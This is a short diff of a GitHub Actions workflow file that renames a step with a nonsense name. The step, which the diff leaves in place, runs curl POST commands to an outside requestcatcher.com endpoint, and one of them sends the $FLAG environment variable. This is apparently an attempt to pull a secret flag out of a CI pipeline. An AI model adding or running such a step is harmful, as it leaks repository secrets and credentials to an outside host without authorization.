@@ -19,7 +19,7 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: iojdafjd
+      - name: iojdafjddd
         run:  |
           curl -X POST -d 'Hello World!' https://dafasfaf.requestcatcher.com/test 
           curl -X POST -d $FLAG https://dafasfaf.requestcatcher.com/test 
